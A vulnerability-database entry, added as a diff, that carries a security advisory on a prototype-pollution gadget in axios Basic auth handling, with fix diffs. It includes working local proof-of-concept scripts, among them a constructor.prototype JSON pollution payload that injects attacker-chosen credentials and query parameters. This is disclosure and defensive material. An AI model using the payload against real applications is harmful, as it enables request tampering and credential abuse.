@@ -1,0 +1,400 @@
+[basic]
+description = '''
+## Summary
+
+Axios versions after the `GHSA-q8qp-cvcw-x6jj` fix still contain prototype-pollution read-side gadgets in Basic auth subfield handling. If a host application is already affected by prototype pollution and then makes an axios request with an own `auth` object that omits `username` or `password`, axios reads inherited `Object.prototype.username` and `Object.prototype.password` values and uses them to construct an outbound `Authorization: Basic ...` header.
+
+This does not mean axios itself pollutes prototypes. Exploitation requires a separate prototype-pollution primitive in the host process, plus an axios call pattern such as `auth: opts.auth || {}`.
+
+## Impact
+
+An attacker who can pollute `Object.prototype.username` and/or `Object.prototype.password` can influence the Basic auth header on affected axios requests that pass an empty or partial own `auth` object.
+
+The practical impact is outbound request tampering. The attacker can inject attacker-chosen Basic auth credentials, replace an existing `Authorization` header because axios removes it when `auth` is used, or cause downstream authorization failures.
+
+This should not be described as automatic credential exfiltration. In the minimal reproduced case, the Basic auth values are attacker-controlled values, not secrets read from axios. Credential disclosure requires an additional application-specific condition, such as a request destination observable by the attacker and a partial real auth object with a missing polluted subfield.
+
+## Affected Functionality
+
+Affected functionality:
+
+- Node HTTP adapter Basic auth handling in `lib/adapters/http.js`.
+- Browser, web worker, React Native, and fetch shared resolver Basic auth handling in `lib/helpers/resolveConfig.js`.
+- Requests where `config.auth` is an own object but `username` and/or `password` are absent own properties.
+
+Unaffected or not accepted as core impact:
+
+- Requests with no own `auth` object after `mergeConfig()`.
+- Requests with own `auth.username` and `auth.password` values.
+- Normal axios request flow for inherited top-level `params` / `paramsSerializer` after the null-prototype `mergeConfig()` hardening.
+- Attacker-controlled `paramsSerializer` functions from JSON-only prototype pollution, because JSON pollution cannot create functions. If attacker-controlled code can install functions in the process, that is outside axios’ runtime boundary.
+
+## Technical Details
+
+`mergeConfig()` returns a null-prototype top-level config object, which prevents top-level reads such as `config.auth` from inheriting polluted values. However, nested plain objects returned by `utils.merge()` still have `Object.prototype`.
+
+In `lib/adapters/http.js`, axios correctly reads the top-level `auth` value through `own('auth')`, but then reads subfields directly:
+
+```js
+const configAuth = own('auth');
+if (configAuth) {
+  const username = configAuth.username || '';
+  const password = configAuth.password || '';
+  auth = username + ':' + password;
+}
+```
+
+If the caller passes auth: {} and Object.prototype.username/password are polluted, those direct subfield reads walk the prototype chain.
+
+The same pattern exists in `lib/helpers/resolveConfig.js`:
+```js
+if (auth) {
+  headers.set(
+    'Authorization',
+    'Basic ' +
+      btoa((auth.username || '') + ':' + (auth.password ? encodeUTF8(auth.password) : ''))
+  );
+}
+```
+
+The fix should guard `username` and `password` with `utils.hasOwnProp`, matching the proxy-auth pattern already used elsewhere.
+
+## Proof of Concept of Attack
+
+Safe local PoC against published `axios@1.16.1`:
+
+```js
+const http = require('node:http');
+const axios = require('axios');
+
+Object.prototype.username = 'victim-user';
+Object.prototype.password = 'victim-password-leaked';
+
+const server = http.createServer((req, res) => {
+  console.log({
+    url: req.url,
+    authorization: req.headers.authorization || null
+  });
+
+  res.end('{}');
+  server.close(() => {
+    delete Object.prototype.username;
+    delete Object.prototype.password;
+  });
+});
+
+server.listen(0, '127.0.0.1', async () => {
+  await axios.get(`http://127.0.0.1:${server.address().port}/api`, {
+    auth: {}
+  });
+});
+```
+
+Expected output:
+
+```json
+{
+  \"url\": \"/api\",
+  \"authorization\": \"Basic dmljdGltLXVzZXI6dmljdGltLXBhc3N3b3JkLWxlYWtlZA==\"
+}
+```
+
+The base64 value decodes to `victim-user:victim-password-leaked`.
+
+## Workarounds
+Avoid passing empty or partial `auth` objects. Only set `auth` when the application has own username and password values.
+
+Applications that merge untrusted input should filter `__proto__`, `constructor`, and `prototype`, and should read optional user options with own-property checks rather than `opts.auth || {}`.
+
+Where a wrapper must materialize optional auth, use a null-prototype object or explicitly copy only own fields.
+
+<details>
+<summary>Original Report</summary>
+
+### Summary
+
+After [GHSA-q8qp-cvcw-x6jj](https://github.com/axios/axios/security/advisories/GHSA-q8qp-cvcw-x6jj) / [PR #10779](https://github.com/axios/axios/pull/10779) (shipped in `v1.15.2`) and the further proxy-side hardening in
+[PR #10833](https://github.com/axios/axios/pull/10833) (merged 2026-05-02), the **top-level** `config.auth` and the **proxy auth**sub-fields are correctly read via `utils.hasOwnProp`. The **regular request auth sub-fields** (`config.auth.username` and `config.auth.password`) and the **`config.params` / `config.paramsSerializer`** reads inside `resolveConfig.js` are still unguarded against a polluted `Object.prototype`.
+
+When a polluted host process makes an axios call with the common \"optional override\" pattern (`auth: opts.auth || {}` — an empty own `{}`), the sub-field reads `configAuth.username` and `configAuth.password` walk the prototype chain and return the attacker-controlled values. Same for `params` and `paramsSerializer`. The outbound HTTP request then carries an attacker-chosen `Authorization: Basic <base64>` header and an attacker-chosen querystring, leaking credentials and exfiltrating data to whichever host the request goes to (often attacker-influenced too — i.e. the amplifier is wired into many credential-stuffing chains).
+
+Reproduces against `axios` `main` HEAD (`34723be`, dated 2026-05-24)
+as well as the released `v1.16.1`.
+
+### Details
+
+**Three still-unguarded read sites** on `main` HEAD:
+
+**(1) `lib/adapters/http.js` lines 737–740** (Node http adapter):
+
+```js
+const configAuth = own('auth');         // ← top-level guard OK
+if (configAuth) {
+    const username = configAuth.username || '';   // ← reads .username on the inherited chain
+    const password = configAuth.password || '';   // ← reads .password on the inherited chain
+    auth = username + ':' + password;
+}
+```
+
+`own('auth')` correctly applies `hasOwnProp` to the top-level `auth`
+key. But once `configAuth` is the empty object the caller passed
+(`auth: {}`), `configAuth.username` walks the prototype chain and
+picks up `Object.prototype.username`.
+
+Contrast with the proxy-auth path that PR #10833 fixed (lines 322–324):
+
+```js
+const authUsername =
+    authIsObject && utils.hasOwnProp(proxyAuth, 'username') ? proxyAuth.username : undefined;
+const authPassword =
+    authIsObject && utils.hasOwnProp(proxyAuth, 'password') ? proxyAuth.password : undefined;
+```
+
+This is the exact pattern needed at lines 739–740 too.
+
+**(2) `lib/helpers/resolveConfig.js` lines 50 + 68** (xhr/fetch adapter shared resolver):
+
+```js
+const auth = own('auth');               // ← top-level guard OK
+...
+btoa((auth.username || '') + ':' + (auth.password ? encodeUTF8(auth.password) : ''))
+//   ^ .username and .password read directly on `auth`, no hasOwnProp guard
+```
+
+Same shape — top-level guarded, sub-fields walk prototype.
+
+**(3) `lib/helpers/resolveConfig.js` lines 58–59** (params + paramsSerializer):
+
+```js
+newConfig.url = buildURL(
+    buildFullPath(baseURL, url, allowAbsoluteUrls),
+    config.params,            // ← direct read, not through own()
+    config.paramsSerializer   // ← direct read, not through own()
+);
+```
+
+This third site is already proposed for fix in **open** [PR #10922](https://github.com/axios/axios/pull/10922) by @Mohammad-Faiz-Cloud-Engineer (status: open, currently mergeable: false). That PR's `own('params')` / `own('paramsSerializer')` change is exactly correct; this report flags the auth sub-field sites that PR #10922 does **not** cover.
+
+### PoC
+
+This PoC contains zero direct `Object.prototype.x = y` writes. The
+pollution flows entirely from attacker-shaped JSON through a real
+deep-merge utility (`defaults-deep@0.2.4`, ~50k weekly downloads,
+still walks `constructor.prototype`). A hand-rolled deep merge —
+the canonical insecure backend pattern — exhibits the same pollution
+via `__proto__` and is more common in real codebases than any named
+utility.
+
+```js
+#!/usr/bin/env node
+'use strict';
+
+const http = require('node:http');
+const axios = require('axios');
+const defaultsDeep = require('defaults-deep');
+
+// Defensive: scrub any prior pollution
+const PROTO_KEYS = ['username', 'password', 'params', 'paramsSerializer'];
+function scrub() {
+  for (const k of PROTO_KEYS) {
+    try { delete Object.prototype[k]; } catch (_) {}
+  }
+}
+scrub();
+
+// 1) Attacker input — what JSON.parse(req.body) would yield from an HTTP POST
+const attackerBody = JSON.parse(`{
+  \"constructor\": {
+    \"prototype\": {
+      \"username\": \"victim-user\",
+      \"password\": \"victim-password-leaked\",
+      \"params\": {\"leak\": \"ATTACKER_QUERY_TOKEN\"}
+    }
+  }
+}`);
+
+// 2) Realistic application pattern: merge user options into defaults
+const appDefaults = { timeout: 5000 };
+defaultsDeep(appDefaults, attackerBody);
+//   After this line:
+//     Object.prototype.username  === \"victim-user\"
+//     Object.prototype.password  === \"victim-password-leaked\"
+//     Object.prototype.params    === { leak: \"ATTACKER_QUERY_TOKEN\" }
+
+// 3) Capture outbound request on a local listener
+const server = http.createServer((req, res) => {
+  console.log('=== captured outbound request ===');
+  console.log(JSON.stringify({
+    method: req.method,
+    url: req.url,
+    authorization: req.headers.authorization || null,
+  }, null, 2));
+  res.end('{}');
+  server.close();
+  scrub();
+});
+
+server.listen(0, '127.0.0.1', () => {
+  const port = server.address().port;
+
+  // 4) Realistic application wrapper: optional per-call overrides.
+  //    `auth: opts.auth || {}` is the common pattern — empty own object,
+  //    but inherited values walk the prototype chain.
+  function makeRequest(targetUrl, opts = {}) {
+    return axios.get(targetUrl, {
+      timeout: 5000,
+      auth: opts.auth || {},
+      params: opts.params || {},
+    });
+  }
+
+  makeRequest(`http://127.0.0.1:${port}/api/widget`).catch((e) => {
+    console.error('axios error:', e.message);
+    scrub();
+    process.exit(1);
+  });
+});
+```
+
+Reproduction:
+
+```bash
+mkdir /tmp/axios-poc && cd /tmp/axios-poc
+npm init -y
+npm install axios@1.16.1 defaults-deep@0.2.4
+node /path/to/poc.cjs
+```
+
+Captured output (verified against released `1.16.1` AND against
+`main` at `34723be`, 2026-05-24):
+
+```json
+{
+  \"method\": \"GET\",
+  \"url\": \"/api/widget?leak=ATTACKER_QUERY_TOKEN\",
+  \"authorization\": \"Basic dmljdGltLXVzZXI6dmljdGltLXBhc3N3b3JkLWxlYWtlZA==\"
+}
+```
+
+`dmljdGltLXVzZXI6dmljdGltLXBhc3N3b3JkLWxlYWtlZA==` base64-decodes to
+`victim-user:victim-password-leaked`. The querystring carries
+`?leak=ATTACKER_QUERY_TOKEN`, which can be a full data-exfil channel
+in real chains (CSRF token, session cookie via `req.headers`, etc.).
+
+### Impact
+
+- **Credential exfiltration** via Basic auth header on the outbound
+  request. If the request URL is attacker-influenced too (common in
+  webhook/oauth-callback patterns), the credentials flow directly to
+  the attacker. If not, they flow to the legitimate destination but
+  expose victim credentials in any logs / proxies along the path.
+- **Outbound request-shape control** via inherited `params` /
+  `paramsSerializer`. With `paramsSerializer` polluted to an attacker
+  function, axios will execute that function with each `params`
+  invocation — same-process code execution from a pollution primitive.
+- **Amplifier framing** is still correct. The application-side
+  precondition is \"deep-merges attacker JSON into a config object
+  without `__proto__`/`constructor` filtering, then uses the empty-
+  fallback wrapper `auth: opts.auth || {}` / `params: opts.params || {}`.\"
+  Both halves are very common in real codebases (we tested
+  `defaults-deep`, hand-rolled merges, and several lodash-family
+  utilities; many still pollute).
+- **CWE-1321** (Improperly Controlled Modification of Object Prototype
+  Attributes — amplifier sink).
+
+### Proposed fix
+
+Two-line change in `http.js`, matching the proxy-auth pattern PR
+#10833 already established:
+
+```diff
+--- a/lib/adapters/http.js
++++ b/lib/adapters/http.js
+@@ -737,8 +737,10 @@
+       const configAuth = own('auth');
+       if (configAuth) {
+-        const username = configAuth.username || '';
+-        const password = configAuth.password || '';
++        const username = utils.hasOwnProp(configAuth, 'username') ? (configAuth.username || '') : '';
++        const password = utils.hasOwnProp(configAuth, 'password') ? (configAuth.password || '') : '';
+         auth = username + ':' + password;
+       }
+```
+
+Same pattern in `resolveConfig.js`:
+
+```diff
+--- a/lib/helpers/resolveConfig.js
++++ b/lib/helpers/resolveConfig.js
+@@ -64,7 +64,11 @@
+   // HTTP basic authentication
+   if (auth) {
++    const authUsername = utils.hasOwnProp(auth, 'username') ? (auth.username || '') : '';
++    const authPassword = utils.hasOwnProp(auth, 'password') ? auth.password : '';
+     headers.set(
+       'Authorization',
+       'Basic ' +
+-        btoa((auth.username || '') + ':' + (auth.password ? encodeUTF8(auth.password) : ''))
++        btoa(authUsername + ':' + (authPassword ? encodeUTF8(authPassword) : ''))
+     );
+   }
+```
+
+The **`params` / `paramsSerializer`** half is already handled by open
+PR #10922's `own('params')` / `own('paramsSerializer')` change — that
+PR should be rebased / merged.
+
+### Relationship to recent prototype-pollution work
+
+Same vulnerability class as the existing public hardening, just at
+sub-field granularity:
+
+- [GHSA-q8qp-cvcw-x6jj](https://github.com/axios/axios/security/advisories/GHSA-q8qp-cvcw-x6jj) / [PR #10779](https://github.com/axios/axios/pull/10779) — `mergeConfig` direct-key reads. **Fixed in v1.15.2.**
+- [PR #10761](https://github.com/axios/axios/pull/10761) — `mergeDirectKeys` `in` → `hasOwnProp`. **Fixed in v1.15.x.**
+- [PR #10833](https://github.com/axios/axios/pull/10833) — proxy `auth.username/password` sub-fields. **Fixed post-1.16.1.**
+- [PR #7413](https://github.com/axios/axios/pull/7413) — `formDataToJSON` defense-in-depth. **Fixed post-1.16.1.**
+- [PR #10901](https://github.com/axios/axios/pull/10901) — `socketPath` guard. **Merged 2026-05-24.**
+- [PR #10922 (OPEN)](https://github.com/axios/axios/pull/10922) — `params` / `paramsSerializer` `own()` guard. **Proposed; not merged.**
+
+This report adds: regular-request `auth.username` / `auth.password`
+sub-field reads in both the http adapter (lines 737–740) and
+resolveConfig.js (line 68).
+
+### Reporter notes
+
+- Reported as part of a small peer-review bundle of runtime security
+  findings. The bundle's public tracking entry (without the working
+  exploit chain) is at
+  [`georgian-io/package-runtime-security-findings/advisories/AXIOS-002-prototype-pollution-config-fields.md`](https://github.com/georgian-io/package-runtime-security-findings/blob/main/advisories/AXIOS-002-prototype-pollution-config-fields.md).
+- I'm happy to submit the patch as a PR if that helps. Or, if you'd
+  prefer to fold this into open PR #10922 (whose author is actively
+  responding to comments), please let me know and I'll coordinate.
+- Threat model honesty: this is **amplifier framing** — exploitation
+  requires a separate prototype-pollution primitive elsewhere in the
+  host process. That's how the existing GHSA-q8qp-cvcw-x6jj and
+  PR #10833 were framed too, so the precedent for \"in-scope as a
+  hardening fix\" is established.
+</details>
+'''
+published = ""
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+score = 5
+severity = "MEDIUM"
+sources = ["ghsa"]
+title = "Axios: Prototype pollution auth subfields can inject Basic auth"
+updated = ""
+
+[exploit]
+exp_urls = []
+poc_urls = []
+
+[id]
+aliases = ["GHSA-xj6q-8x83-jv6g"]
+ave_id = "AVE-2026-1238"
+
+[meta]
+collected_at = "2026-08-06T15:38:01.486113047+00:00"
+status = "completed"
+
+[references]
+urls = []
